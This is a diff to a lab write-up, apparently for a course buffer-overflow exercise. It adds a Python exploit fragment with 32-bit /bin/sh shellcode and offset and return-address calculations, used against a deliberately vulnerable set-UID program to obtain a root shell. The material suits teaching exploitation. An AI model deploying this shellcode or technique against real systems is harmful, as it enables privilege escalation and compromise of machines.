@@ -88,8 +88,8 @@ int main(int argc, char **argv)
 By running `make`, we obtain:
 ![make](/Lab7/exercise2/img/1.png)
 
-- `stack-LX`: 32-bit and 64 bit vulnerable programs for diferents levels (X).
-- `stack-X-dbg`: 32-bit and 64 bit vulnerable program with debugging information added to the  for diferents levels (X).
+- `stack-LX`: 32-bit or 64 bit vulnerable programs for diferents levels (X).
+- `stack-X-dbg`: 32-bit or 64 bit vulnerable program with debugging information added to the  for diferents levels (X).
 
 ## Exercise 3: Launching Attack on 32-bit Program (Level 1)
 
@@ -120,8 +120,35 @@ Now we know that:
 - offset = ebp - buffer + L
 - ret = buffer + offset + 100
 
+![attacks](/Lab7/exercise3/img/1.png)
 
-# Calculate the offset to place the return address right after the buffer
+
+### Launching Attacks
+
+To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload and save it inside `/Lab7/exercise3/badfile`. 
+
+We will utilize the `/Lab7/exercise3/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:
+
+
+
+```python
+# Place the shellcode towards the end of the buffer
+shellcode= (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# In this example, we're assuming a 32-bit architecture.
+L = 4
+
+# Calculate the offset to place the return address right after the buffer (ebp - buffer + L)
 offset = 0xbfffeb38 - 0xbfffeacc + L # The size of the buffer in the vulnerable program
-# Use a debugger to find the correct return address.
+# Return address (buffer + offset + buffersize).
 ret = 0xbfffeacc + offset + 100 
+```
+
+Finally running `/Lab7/exercise3/stack-L1` (the set-UID program) will give us the root shell  due to copying excess data from the `badfile` which causes buffer overflow. By doing so, we can redirect the program's execution flow to a location controlled by `badfile`, 
+
+
+![attacks](/Lab7/exercise3/img/2.png)
